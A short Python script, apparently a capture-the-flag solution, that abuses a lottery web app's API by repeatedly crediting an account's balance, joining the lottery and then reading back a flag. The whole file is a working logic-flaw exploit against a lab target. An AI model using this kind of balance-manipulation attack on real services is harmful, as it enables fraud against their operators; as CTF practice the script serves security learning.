import requests
import time

URL = "https://lottery.zajebistyc.tf"


class Account:

    name = None

    def __init__(self):
        self.name = self.create()

    def create(self):
        resp = requests.post(URL + "/account")
        if resp.status_code != 200:
            raise Exception("couldn't create account: status code = " + str(resp.status_code))
        return resp.json()["name"]

    def add_amount(self, amount):
        requests.post(URL + "/account/" + self.name + "/amount", json={"amount": amount})

    def get(self):
        resp = requests.get(URL + "/account/" + self.name)
        return resp.json()

    def lottery_add(self):
        requests.post(URL + "/lottery/add", json={"accountName": self.name})

    def lottery_results(self):
        resp = requests.get(URL + "/lottery/results")
        return resp.json()


def hack():
    a = Account()
    a.add_amount(90)
    a.add_amount(90)
    a.add_amount(90)

    a.lottery_add()
    a.add_amount(90)

    time.sleep(11)
    print(a.get()["flag"])


if __name__ == "__main__":
    hack()
